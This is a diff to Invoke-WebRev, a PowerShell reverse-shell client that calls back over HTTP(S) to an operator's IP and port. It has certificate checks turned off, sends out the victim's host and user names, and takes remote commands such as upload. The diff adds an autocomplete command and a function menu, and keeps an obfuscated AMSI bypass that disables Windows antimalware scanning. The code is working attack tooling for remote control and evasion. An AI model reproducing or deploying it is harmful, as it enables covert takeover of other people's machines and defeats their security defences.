@@ -32,7 +32,7 @@ function Invoke-WebRev{
     
     if ($ssl) { $url="https://" + $ip + ":" + $port + "/"; } else { $url="http://" + $ip + ":" + $port + "/"; }
     $x = "taleska-ei-vrixeka"; Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158]);
-    Invoke-Fuckyou;
+    Invoke-FuckYou;
     $pwd_b64 = getPwd;
     $hname = toBase64 -str "$env:computername";
     $cuser = toBase64 -str "$env:username";
@@ -44,7 +44,11 @@ function Invoke-WebRev{
     $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12';
     [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols;
     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+
     try { $error[0] = ""; } catch {}
+
+    $previous_functions = (ls function:).Name
+    [array]$preloaded_functions = (ls function: | Where-Object {($_.name).Length -ge "4"} | select-object name | format-table -HideTableHeaders | Out-String -Stream )
 
     while ($true)
     {
@@ -57,7 +61,14 @@ function Invoke-WebRev{
             $result = "";
             $dataToSend = "";
 
-            if($cstr.split(" ")[0] -eq "upload")
+            if($cstr.split(" ")[0] -eq "autocomplete")
+            {
+                $functs = (Get-Command | Where-Object {($_.name).Length -ge "4"} | select-object name | format-table -HideTableHeaders | Out-String -Stream);
+                $functs = toBase64 -str "$functs";
+                $type = '"type":"4UT0C0MPL3T3"';
+                $result = $functs;
+            }
+            elseif($cstr.split(" ")[0] -eq "upload")
             {
                 $type = '"type":"UPL04D"';
                 try
@@ -171,9 +182,33 @@ function getPwd()
 }
 
 
-function Invoke-Fuckyou
+function Invoke-FuckYou
 {
     [Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('Syste' + 'm.Ref' + 'lect' + 'ion.Bi' + 'ndi' + 'ngF' + 'lags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('Syste' + 'm.Typ' + 'e')), [Object]([Ref].Assembly.GetType('Syste' + 'm.Man' + 'agemen' + 't.Automa' + 'tion.Am' + 'siU' + 'ti' + 'ls')),('GetF' + 'ield')).Invoke('am' + 'siIn' + 'itFai' + 'led',(('NonPu' + 'blic,S' + 'tatic') -as [String].Assembly.GetType('Syste' + 'm.Refl' + 'ection.B' + 'indingF' + 'lags'))).SetValue($null,$True)
 }
 
-#Invoke-WebRev -ip 192.168.230.128 -port 80
+function Get-ImportedFunctions
+{
+    $menu = @"
+
+         By: 3v4Si0N
+"@
+
+    if ([int]$PSVersionTable.PSVersion.Major -ge 4 ) {
+        $current_functions = (ls function:).Name
+        [array]$preloaded_functions = "Close_Console","Close_DNS","Close_TCP","Close_UDP","Main","Main_Powershell","ReadData_CMD","ReadData_Console","ReadData_DNS","ReadData_TCP","ReadData_UDP","Setup_CMD","Setup_Console","Setup_DNS","Setup_TCP","Setup_UDP", "Stream1_Close","Stream1_ReadData","Stream1_Setup","Stream1_WriteData","WriteData_CMD","WriteData_Console","WriteData_DNS","WriteData_TCP","WriteData_UDP","Close_CMD","menu","f","func"
+        $current_functions = $current_functions + $preloaded_functions
+        $new_functions = (Compare-Object -ReferenceObject $previous_functions -DifferenceObject $current_functions).InputObject
+        $output = foreach ($new_function in $new_functions) { if ($preloaded_functions -notcontains $new_function) {"`n [+] $new_function"}}
+        $menu = $menu + $output + "`n";
+    } else {
+        [array]$new_functions = (ls function: | Where-Object {($_.name).Length -ge "4" -and $_.name -notlike "Close_*" -and $_.name -notlike "ReadData_*" -and $_.name -notlike "Setup_*" -and $_.name -notlike "Stream1_*" -and $_.name -notlike "WriteData_*" -and $_.name -notlike "Menu" -and $_.name -ne "f" -and $_.name -ne "func" -and $_.name -ne "Main" -and $_.name -ne "Main_Powershell"} | select-object name | format-table -HideTableHeaders | Out-String -Stream )
+        $show_functions = ($new_functions | where {$preloaded_functions -notcontains $_}) | foreach {"`n[+] $_"}
+        $show_functions = $show_functions -replace "  ","" 
+        $menu = $menu + $show_functions + "`n"
+        $menu = $menu -replace " [+]","[+]"
+    }
+    return $menu;
+}
+
+#Invoke-WebRev -ip 192.168.224.130 -port 80
